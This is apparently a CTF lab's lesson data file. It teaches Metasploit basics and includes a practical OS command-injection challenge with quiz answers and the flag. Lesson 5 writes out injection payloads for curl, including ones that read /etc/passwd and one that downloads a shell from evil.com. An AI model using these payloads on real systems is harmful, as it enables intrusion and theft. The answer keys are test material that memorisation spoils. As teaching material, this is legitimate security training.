/* ================================================
   CTF LABS — Metasploit Deep Dive Lab Data
   ================================================ */

const LESSONS = [
  // ─── LESSON 1: THE METASPLOIT DATABASE ───────────────────────────
  {
    title: "The Metasploit Database (db_status)",
    points: 40,
    icon: "🗄️",
    practical: false,
    content: `THE METASPLOIT DATABASE & WORKSPACES

When conducting a penetration test or security assessment, managing information is key. Metasploit integrates with a PostgreSQL database to store host information, open ports, vulnerability scan results, services, and credentials.

Why Use the Database?
─────────────────────
Instead of copy-pasting hosts and open ports into a text file, Metasploit's database allows you to:
  • Save Nmap scans directly into Metasploit database.
  • Keep track of discovered services and hosts.
  • Quickly set RHOSTS by referencing database entries.
  • Maintain session logs and credentials.

Key Database Commands in msfconsole:
─────────────────────────────────────
  1. db_status
     Checks if Metasploit is successfully connected to the PostgreSQL database.
     Example output:
     msf6 > db_status
     [*] Connected to msf. Connection type: postgresql.

  2. workspace
     Lists available workspaces. Workspaces isolate different target networks.
     • Create a workspace: workspace -a <name>
     • Delete a workspace: workspace -d <name>
     • Switch workspaces: workspace <name>

  3. db_nmap
     Runs Nmap directly from within msfconsole and automatically saves the scan results to the active workspace database.
     Example:
     msf6 > db_nmap -sV 10.10.10.5

  4. hosts
     Lists all hosts saved in the database.

  5. services
     Lists all services discovered on all hosts (ports, protocols, names, states).`,
    questions: [
      { q: "What database management system does Metasploit integrate with? (one word)", a: "postgresql" },
      { q: "What command verifies the connection status of the Metasploit database?", a: "db_status" },
      { q: "What command creates a new workspace named 'internal'?", a: "workspace -a internal" },
      { q: "What command runs an Nmap version scan on 10.10.10.5 and saves it directly to the database?", a: "db_nmap -sV 10.10.10.5" },
      { q: "What command lists all discovered services across all hosts in the database?", a: "services" }
    ]
  },

  // ─── LESSON 2: METASPLOIT MODULE TYPES & PATHS ───────────────────
  {
    title: "Module Types, Search Filters & Context",
    points: 50,
    icon: "📂",
    practical: false,
    content: `DEEP DIVE INTO MODULE PATHS & FILTERING

Metasploit organizes its modules systematically in a directory structure. Understanding this structure helps you find modules quickly.

Module Directory Structure:
───────────────────────────
The standard Metasploit path looks like:
  <type>/<platform>/<service>/<name>

For example:
  exploit/linux/http/webmin_backdoor
    • type = exploit
    • platform = linux
    • service/protocol = http
    • name = webmin_backdoor

Advanced Search Filters:
────────────────────────
When you run a standard 'search' command, Metasploit returns hundreds of results. You can narrow down your search using filters:

  • type:<type>      - Search by module type (exploit, auxiliary, post, payload, encoder, evasion, nop)
  • platform:<name>  - Search by target OS/platform (windows, linux, unix, android, osx)
  • port:<number>    - Search for modules targeting a specific port
  • cve:<year>       - Search by CVE year/number
  • rank:<rank>      - Search by reliability rank (excellent, great, good, normal, average, low, manual)

Examples:
  msf6 > search type:exploit platform:linux port:80
  msf6 > search cve:2021 name:log4j

The 'info' Command:
──────────────────
Before using any module, you should inspect its capabilities, author, CVE references, and default options.
  msf6 > info exploit/linux/http/webmin_backdoor`,
    questions: [
      { q: "What search filter restricts search results to 'exploit' modules only?", a: "type:exploit" },
      { q: "What search filter restricts results to the Windows platform?", a: "platform:windows" },
      { q: "What command displays detailed information (description, authors, targets) for a specific module?", a: "info" },
      { q: "What reliability rank is considered the highest/most reliable in Metasploit?", a: "excellent" }
    ]
  },

  // ─── LESSON 3: PAYLOADS DEEP DIVE (STAGED VS UNSTAGED) ───────────
  {
    title: "Payloads: Staged vs Unstaged",
    points: 50,
    icon: "💣",
    practical: false,
    content: `STAGED VS UNSTAGED PAYLOADS

A payload is the shellcode/application executed on the target after exploitation. Metasploit splits payloads into two main categories: Staged and Unstaged.

1. Staged Payloads:
───────────────────
Staged payloads are split into two parts:
  • Stage 0 (Stager): A tiny stub of code sent to the target. Its only job is to connect back to the attacker's machine, allocate memory, and download the larger, full payload.
  • Stage 1 (Stage): The actual full payload (like Meterpreter) sent over the network once the stager connects.

Pros: Very small footprint, fits into restricted buffer spaces in memory.
Cons: Requires a two-step network connection; more network noise.

How to identify in Metasploit: Staged payloads use a slash (/) to separate elements.
  Example: windows/meterpreter/reverse_tcp

2. Unstaged Payloads (Singles):
───────────────────────────────
Unstaged payloads are completely self-contained. The entire payload code is sent at once in a single transmission.

Pros: More stable, works in environments where multiple network connections are blocked.
Cons: Much larger file size, may not fit in tight exploits.

How to identify in Metasploit: Unstaged payloads use an underscore (_) to join components.
  Example: windows/meterpreter_reverse_tcp

The Meterpreter Payload:
────────────────────────
Meterpreter is an advanced, dynamically extensible payload that runs entirely in memory (via DLL injection) and does not write to disk, leaving a minimal footprint.`,
    questions: [
      { q: "What type of payload is split into a tiny stager and a larger stage? (one word)", a: "staged" },
      { q: "Does the payload path 'linux/x86/shell/reverse_tcp' represent a staged or unstaged payload?", a: "staged" },
      { q: "Does the payload path 'linux/x86/shell_reverse_tcp' represent a staged or unstaged payload?", a: "unstaged" },
      { q: "What is the name of Metasploit's advanced, in-memory payload that avoids writing to the target's disk?", a: "meterpreter" }
    ]
  },

  // ─── LESSON 4: EXPLOITING WEB APPLICATIONS ───────────────────────
  {
    title: "Exploiting Web Applications via Metasploit",
    points: 60,
    icon: "🌐",
    practical: false,
    content: `EXPLOITING WEB APPLICATIONS

While Metasploit is famous for network service exploits (SMB, SSH, FTP), it also has a massive database of web application scanners and exploits.

Web Exploitation Concepts:
──────────────────────────
When targeting web apps, the RHOSTS parameter usually refers to the target domain or IP, but web apps often run on custom paths (like /blog or /app). Metasploit uses additional settings:

  • LHOST: Your local interface IP (attacker host). Necessary for reverse shells to know where to connect back.
  • LPORT: Your local listening port.
  • TARGETURI (or URI): The directory path of the vulnerable web application.
  • SSL: Boolean to enable or disable HTTPS transport.

Scanning Web Services:
──────────────────────
Before launching an exploit, you should always scan and verify target vulnerability:
  • auxiliary/scanner/http/http_version: Detects web server banner.
  • auxiliary/scanner/http/dir_scanner: Locates web directories.

Exploit Verification:
─────────────────────
Many exploit modules include a "check" feature that probes the target to see if the vulnerability exists WITHOUT actually running the exploit code.
  msf6 > check
  [*] 10.10.10.5:80 - The target is vulnerable.`,
    questions: [
      { q: "What option defines the local listening IP of the attacker for reverse connections?", a: "LHOST" },
      { q: "What option defines the path directory where the web application is hosted? (e.g. /wp-content)", a: "TARGETURI" },
      { q: "What command tests if a target is vulnerable without actually executing the exploit payload?", a: "check" },
      { q: "What option must be set to 'true' if the web server requires HTTPS? (three letters)", a: "SSL" }
    ]
  },

  // ─── LESSON 5: PRACTICAL CHALLENGE (DOCKER PANELS SHOWN HERE) ────
  {
    title: "Practical — Exploit the Target API",
    points: 60,
    icon: "⚔️",
    practical: true,
    content: `PRACTICAL CHALLENGE — COMMAND INJECTION VIA CURL

In this practical lesson, you will exploit a vulnerable 
web API running on a Docker container.

═══════════════════════════════════════════════════
  🎯  YOUR MISSION: Find and exploit a Command 
      Injection vulnerability to capture the flag.
═══════════════════════════════════════════════════

WHAT IS COMMAND INJECTION?
──────────────────────────
The target is a web server called "SecureCorp API Portal".
It has an endpoint:  /api/diagnostics?cmd=<command>

The developers forgot to sanitise user input — the 'cmd' 
parameter is passed directly to the server's operating 
system! This is called OS Command Injection.


STEP-BY-STEP WALKTHROUGH:
─────────────────────────

STEP 1 — Launch Both Containers
  ┌───────────────────────────────────────────────┐
  │  ① Click "Launch Target Server" above.        │
  │  ② Click "Start Kali Container" above.        │
  │  ③ Note the TARGET IP (e.g. 172.17.0.2)       │
  │  ④ Note the Kali docker exec command shown.   │
  └───────────────────────────────────────────────┘

STEP 2 — Connect to Your Kali Container
  ┌───────────────────────────────────────────────┐
  │  Open a terminal on your HOST machine and     │
  │  paste the command shown in the Kali panel:   │
  │                                               │
  │  $ docker exec -it <container-id> bash        │
  │                                               │
  │  You are now inside Kali Linux!               │
  └───────────────────────────────────────────────┘

STEP 3 — Discover the Target
  ┌───────────────────────────────────────────────┐
  │  Use curl to visit the target homepage:       │
  │                                               │
  │  $ curl http://<TARGET_IP>/                   │
  │                                               │
  │  You'll see the SecureCorp API Portal HTML.   │
  │  Notice the hint on the page:                 │
  │  "/api/diagnostics?cmd=ping"                  │
  └───────────────────────────────────────────────┘

STEP 4 — Test the Normal Endpoint
  ┌───────────────────────────────────────────────┐
  │  Send a legitimate ping command:              │
  │                                               │
  │  $ curl http://<TARGET_IP>/api/diagnostics?cmd=ping  │
  │                                               │
  │  The server responds with ping output.        │
  │  This proves the 'cmd' parameter controls     │
  │  what the server executes!                    │
  └───────────────────────────────────────────────┘

STEP 5 — Exploit with Command Injection!
  ┌───────────────────────────────────────────────┐
  │                                               │
  │  ⚠️ IMPORTANT: URL ENCODING                  │
  │  Special characters must be URL-encoded       │
  │  when sent in a URL:                          │
  │    ;  →  %3B   (semicolon)                    │
  │    |  →  %7C   (pipe)                         │
  │    (space) → %20                              │
  │                                               │
  │  The semicolon (;) tells the server to        │
  │  finish the first command and start a new     │
  │  one. We URL-encode it so curl sends it       │
  │  correctly to the server.                     │
  │                                               │
  │  Run this exact command (replace <TARGET_IP>  │
  │  with the IP shown in the Target panel):      │
  │                                               │
  │  $ curl "http://<TARGET_IP>/api/diagnostics?cmd=ping%3Bcat%20/etc/flag"  │
  │                                               │
  │  ───────────────────────────────────────────  │
  │  BREAKDOWN:                                   │
  │  • ping        = the normal command           │
  │  • %3B         = ; (start a 2nd command)      │
  │  • cat%20      = cat (space = %20)            │
  │  • /etc/flag   = the file we want to read     │
  │  ───────────────────────────────────────────  │
  │                                               │
  │  🚩 The server returns the FLAG in JSON!      │
  └───────────────────────────────────────────────┘

ALTERNATIVE METHOD (pipe instead of semicolon):
  ┌───────────────────────────────────────────────┐
  │  $ curl "http://<TARGET_IP>/api/diagnostics?cmd=ping%7Ccat%20/etc/flag"  │
  │                                               │
  │  %7C = pipe (|) character — also works!       │
  └───────────────────────────────────────────────┘


WHY THIS WORKS:
───────────────
The server takes your 'cmd' parameter and passes it 
directly to the operating system. When it sees:
  ping ; cat /etc/flag
It runs TWO commands: first 'ping', then 'cat /etc/flag'.

In a real attack, this would allow an attacker to:
  • Read files:    cmd=ping%3Bcat%20/etc/passwd
  • Download malware:  cmd=ping%3Bwget%20http://evil.com/shell.sh
  • Create reverse shells back to the attacker

This is why INPUT VALIDATION is critical!`,
    questions: [
      { q: "What Linux command did you use to make HTTP requests from the Kali terminal? (one word)", a: "curl" },
      { q: "What is the URL-encoded representation of a semicolon? (e.g. %XX)", a: "%3B" },
      { q: "What is the vulnerable API endpoint path on the target server?", a: "/api/diagnostics" }
    ]
  },

  // ─── LESSON 6: FLAG SUBMISSION ───────────────────────────────────
  {
    title: "🚩 Capture the Flag",
    points: 20,
    icon: "🚩",
    practical: false,
    content: `🚩 FLAG SUBMISSION

═══════════════════════════════════════════════════
        SUBMIT YOUR CAPTURED FLAG BELOW
═══════════════════════════════════════════════════

If you successfully ran the exploit command from 
the previous lesson, the server returned a JSON 
response containing the flag.

The response should look like this:
┌─────────────────────────────────────────────────┐
│  {                                              │
│    "status": "success",                         │
│    "output": "Simulated RCE Triggered:          │
│               FLAG{MSF_D33P_D1V3_M4ST3R}",      │
│    "debug_info": "Warning: Command              │
│     sanitization failed. Unauthorized           │
│     command context executed."                   │
│  }                                              │
└─────────────────────────────────────────────────┘

Copy the FLAG{...} value from the JSON output and 
paste it into the answer box below.


QUICK REFERENCE — Commands You Used:
─────────────────────────────────────
  ① curl http://<IP>/
     → Discovered the API hint

  ② curl http://<IP>/api/diagnostics?cmd=ping
     → Tested the endpoint works

  ③ curl "http://<IP>/api/diagnostics?cmd=ping%3Bcat%20/etc/flag"
     → Exploited command injection → Got the flag!


WHAT YOU LEARNED IN THIS CHALLENGE:
───────────────────────────────────
  ✅ Metasploit Database — db_status, workspace, 
     db_nmap, hosts, services
  ✅ Module Paths — type/platform/service/name
  ✅ Search Filters — type:, platform:, cve:, rank:
  ✅ Staged vs Unstaged Payloads — slash vs underscore
  ✅ Web Exploitation Options — LHOST, TARGETURI, SSL
  ✅ URL Encoding for special characters
  ✅ Practical Command Injection via curl
  ✅ Why input sanitisation matters

CONGRATULATIONS ON COMPLETING THE METASPLOIT DEEP DIVE! 🎉`,
    questions: [
      { q: "Submit the flag you captured from the vulnerable target:", a: "FLAG{MSF_D33P_D1V3_M4ST3R}" }
    ]
  }
];
